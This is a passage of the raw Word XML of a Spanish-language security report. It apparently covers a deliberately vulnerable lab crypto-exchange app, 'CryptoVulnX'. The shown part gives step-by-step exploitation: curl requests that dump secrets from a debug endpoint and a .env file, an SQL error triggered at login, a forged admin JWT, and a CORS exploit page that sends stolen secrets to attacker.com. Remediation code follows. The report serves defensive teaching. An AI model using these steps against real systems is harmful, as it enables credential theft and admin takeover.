        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "debug_info": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "php_version": "8.1.2",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "server_software": "Apache/2.4.52 (Ubuntu)",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "document_root": "/var/www/html/appsec",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "database": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "host": "localhost",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "name": "cryptovulnx_db",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "user": "cryptovulnx_admin",</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "password": "Cr1pt0VulnX_DB@2026!"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "jwt_secret": "supersecretkey_cryptovulnx_2026_changeme",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "jwt_algorithm": "HS256",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "debug_mode": true,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "environment": "production"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 3: Acceder a Variables de Entorno</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s http://localhost/appsec/api/v1/admin/debug.php?action=env</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "environment_variables": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "APP_ENV": "production",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "APP_DEBUG": "true",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "DB_HOST": "localhost",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "DB_NAME": "cryptovulnx_db",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "DB_USER": "cryptovulnx_admin",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "DB_PASS": "Cr1pt0VulnX_DB@2026!",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "JWT_SECRET": "supersecretkey_cryptovulnx_2026_changeme",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "AWS_ACCESS_KEY_ID": "AKIAIOSFODNN7EXAMPLE",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "AWS_REGION": "us-east-1",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "STRIPE_SECRET_KEY": "sk_live_51ABC123DEF456...",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "STRIPE_WEBHOOK_SECRET": "whsec_abc123def456...",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "REDIS_HOST": "127.0.0.1",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "REDIS_PORT": "6379",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "SMTP_PASSWORD": "smtp_pass_2026!"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 4: Obtener phpinfo Completo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s http://localhost/appsec/api/v1/admin/debug.php?action=phpinfo | head -100</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Este endpoint devuelve la salida completa de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>phpinfo()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en formato HTML, exponiendo toda la configuracion de PHP, modulos cargados, rutas del sistema, variables de compilacion, etc.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 5: Acceder al Archivo .env</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s http://localhost/appsec/.env</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>APP_NAME=CryptoVulnX</w:t>
        <w:br/>
        <w:t>APP_ENV=production</w:t>
        <w:br/>
        <w:t>APP_DEBUG=true</w:t>
        <w:br/>
        <w:t>APP_URL=http://localhost/appsec</w:t>
        <w:br/>
        <w:br/>
        <w:t>DB_HOST=localhost</w:t>
        <w:br/>
        <w:t>DB_PORT=3306</w:t>
        <w:br/>
        <w:t>DB_DATABASE=cryptovulnx_db</w:t>
        <w:br/>
        <w:t>DB_USERNAME=cryptovulnx_admin</w:t>
        <w:br/>
        <w:t>DB_PASSWORD=Cr1pt0VulnX_DB@2026!</w:t>
        <w:br/>
        <w:br/>
        <w:t>JWT_SECRET=supersecretkey_cryptovulnx_2026_changeme</w:t>
        <w:br/>
        <w:t>JWT_EXPIRATION=3600</w:t>
        <w:br/>
        <w:br/>
        <w:t>AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE</w:t>
        <w:br/>
        <w:t>AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY</w:t>
        <w:br/>
        <w:t>AWS_DEFAULT_REGION=us-east-1</w:t>
        <w:br/>
        <w:t>AWS_BUCKET=cryptovulnx-kyc-docs</w:t>
        <w:br/>
        <w:br/>
        <w:t>STRIPE_KEY=pk_live_51ABC123DEF456...</w:t>
        <w:br/>
        <w:t>STRIPE_SECRET=sk_live_51ABC123DEF456...</w:t>
        <w:br/>
        <w:br/>
        <w:t>MAIL_PASSWORD=smtp_pass_2026!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 6: Provocar un Error SQL para Obtener la Consulta</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"email":"test'\''","password":"x"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "error",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "message": "Database error",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "debug": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "sql_error": "You have an error in your SQL syntax; check the manual...",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "sql_query": "SELECT * FROM users WHERE email = 'test'' AND password_hash = '9dd4e461268c8034f5c8564e155c67a6'",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "error_code": 1064</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 7: Forjar un Token JWT de Administrador</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Con el secreto JWT obtenido (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>supersecretkey_cryptovulnx_2026_changeme</w:t>
      </w:r>
      <w:r>
        <w:t>), forjar un token de admin:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Instalar PyJWT si no esta disponible</w:t>
        <w:br/>
        <w:t>pip install PyJWT 2&gt;/dev/null</w:t>
        <w:br/>
        <w:br/>
        <w:t># Generar token de administrador forjado</w:t>
        <w:br/>
        <w:t>ADMIN_TOKEN=$(python3 -c "</w:t>
        <w:br/>
        <w:t>import jwt, time</w:t>
        <w:br/>
        <w:t>payload = {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    'sub': 1,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    'email': 'admin@cryptovulnx.com',</w:t>
        <w:br/>
        <w:t xml:space="preserve">    'role': 'admin',</w:t>
        <w:br/>
        <w:t xml:space="preserve">    'iat': int(time.time()),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    'exp': int(time.time()) + 86400</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:t>token = jwt.encode(payload, 'supersecretkey_cryptovulnx_2026_changeme', algorithm='HS256')</w:t>
        <w:br/>
        <w:t>print(token)</w:t>
        <w:br/>
        <w:t>")</w:t>
        <w:br/>
        <w:br/>
        <w:t>echo "Token de admin forjado: $ADMIN_TOKEN"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 8</w:t>
      </w:r>
      <w:r>
        <w:t>: Usar el token forjado para acceder a funcionalidades de administrador.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Acceder al panel de administracion con el token forjado</w:t>
        <w:br/>
        <w:t>curl -s http://localhost/appsec/api/v1/admin/users.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $ADMIN_TOKEN"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "total_users": 1542,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "users": [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {"id": 1, "email": "admin@cryptovulnx.com", "role": "admin", "balance_usdt": 150000},</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {"id": 2, "email": "user1@test.com", "role": "user", "balance_usdt": 5200},</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ...</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ]</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 8: Explotar CORS Permisivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Crear un archivo HTML malicioso que explote el CORS abierto para robar datos:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[html]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;!-- exploit_cors.html - Alojado en sitio del atacante --&gt;</w:t>
        <w:br/>
        <w:t>&lt;script&gt;</w:t>
        <w:br/>
        <w:t>// El CORS: * permite que cualquier origen haga peticiones</w:t>
        <w:br/>
        <w:t>fetch('http://localhost/appsec/api/v1/admin/debug.php?action=env')</w:t>
        <w:br/>
        <w:t xml:space="preserve">  .then(response =&gt; response.json())</w:t>
        <w:br/>
        <w:t xml:space="preserve">  .then(data =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // Enviar los secretos al servidor del atacante</w:t>
        <w:br/>
        <w:t xml:space="preserve">    fetch('https://attacker.com/collect', {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      method: 'POST',</w:t>
        <w:br/>
        <w:t xml:space="preserve">      body: JSON.stringify(data)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    });</w:t>
        <w:br/>
        <w:t xml:space="preserve">    console.log('Secretos exfiltrados:', data);</w:t>
        <w:br/>
        <w:t xml:space="preserve">  });</w:t>
        <w:br/>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Eliminar o Proteger Endpoints de Depuracion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// admin/debug.php - ELIMINAR EN PRODUCCION o proteger estrictamente</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Opcion A: Eliminar el archivo completamente en produccion</w:t>
        <w:br/>
        <w:t>// rm admin/debug.php</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Opcion B: Si es necesario mantenerlo, proteger con autenticacion fuerte</w:t>
        <w:br/>
        <w:t>require_once __DIR__ . '/../middleware/auth.php';</w:t>
        <w:br/>
        <w:t>require_once __DIR__ . '/../middleware/role_check.php';</w:t>
        <w:br/>
        <w:br/>
        <w:t>$decoded = authenticateRequest(); // Verificar JWT</w:t>
        <w:br/>
        <w:t>requireRole($decoded, 'superadmin'); // Solo superadmin</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Verificar que estamos en entorno de desarrollo</w:t>
        <w:br/>
        <w:t>if (getenv('APP_ENV') !== 'development') {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(404);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode(["error" =&gt; "Not found"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Ademas, verificar IP de origen</w:t>
        <w:br/>
        <w:t>$allowed_ips = ['127.0.0.1', '::1', '10.0.0.0/8'];</w:t>
        <w:br/>
        <w:t>if (!isIpAllowed($_SERVER['REMOTE_ADDR'], $allowed_ips)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(403);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode(["error" =&gt; "Forbidden"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Proteger el Archivo .env con Apache</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[apache]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># .htaccess en la raiz del proyecto</w:t>
        <w:br/>
        <w:br/>
        <w:t># Bloquear acceso a archivos ocultos y de configuracion</w:t>
        <w:br/>
        <w:t>&lt;FilesMatch "^\."&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Require all denied</w:t>
        <w:br/>
        <w:t>&lt;/FilesMatch&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t># Bloquear archivos de configuracion especificos</w:t>
        <w:br/>
        <w:t>&lt;FilesMatch "\.(env|ini|log|conf|sql|bak)$"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Require all denied</w:t>
        <w:br/>
        <w:t>&lt;/FilesMatch&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t># Desactivar listado de directorios</w:t>
        <w:br/>
        <w:t>Options -Indexes</w:t>
        <w:br/>
        <w:br/>
        <w:t># Desactivar la firma del servidor</w:t>
        <w:br/>
        <w:t>ServerSignature Off</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. Configurar CORS Restrictivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// middleware/cors.php</w:t>
        <w:br/>
        <w:br/>
        <w:t>$allowed_origins = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    'https://cryptovulnx.com',</w:t>
        <w:br/>
        <w:t xml:space="preserve">    'https://app.cryptovulnx.com',</w:t>
        <w:br/>
        <w:t xml:space="preserve">    'https://admin.cryptovulnx.com'</w:t>
        <w:br/>
        <w:t>];</w:t>
        <w:br/>
        <w:br/>
        <w:t>$origin = $_SERVER['HTTP_ORIGIN'] ?? '';</w:t>
        <w:br/>
        <w:br/>
        <w:t>if (in_array($origin, $allowed_origins)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    header("Access-Control-Allow-Origin: $origin");</w:t>
        <w:br/>
        <w:t xml:space="preserve">    header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");</w:t>
        <w:br/>
        <w:t xml:space="preserve">    header("Access-Control-Allow-Headers: Content-Type, Authorization");</w:t>
        <w:br/>
        <w:t xml:space="preserve">    header("Access-Control-Allow-Credentials: true");</w:t>
        <w:br/>
        <w:t xml:space="preserve">    header("Access-Control-Max-Age: 3600");</w:t>
        <w:br/>
        <w:t>} else {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // No enviar headers CORS para origenes no permitidos</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Manejar preflight</w:t>
        <w:br/>
        <w:t>if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(204);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4. Eliminar Headers Verbosos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// middleware/security_headers.php</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Eliminar headers que revelan informacion</w:t>
        <w:br/>
        <w:t>header_remove('X-Powered-By');</w:t>
        <w:br/>
        <w:t>header_remove('Server');</w:t>
        <w:br/>
        <w:t>header_remove('X-Server-Version');</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Agregar headers de seguridad</w:t>
        <w:br/>
        <w:t>header("X-Content-Type-Options: nosniff");</w:t>
        <w:br/>
        <w:t>header("X-Frame-Options: DENY");</w:t>
        <w:br/>
        <w:t>header("X-XSS-Protection: 1; mode=block");</w:t>
        <w:br/>
        <w:t>header("Strict-Transport-Security: max-age=31536000; includeSubDomains");</w:t>
        <w:br/>
        <w:t>header("Content-Security-Policy: default-src 'self'");</w:t>
        <w:br/>
        <w:t>header("Referrer-Policy: strict-origin-when-cross-origin");</w:t>
        <w:br/>
        <w:t>header("Permissions-Policy: geolocation=(), camera=(), microphone=()");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Adicionalmente en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>php.ini</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[ini]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>; php.ini</w:t>
        <w:br/>
        <w:t>expose_php = Off</w:t>
        <w:br/>
        <w:t>display_errors = Off</w:t>
        <w:br/>
        <w:t>log_errors = On</w:t>
        <w:br/>
        <w:t>error_log = /var/log/php/error.log</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5. Manejo de Errores Seguro (Sin Exposicion de Consultas SQL)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
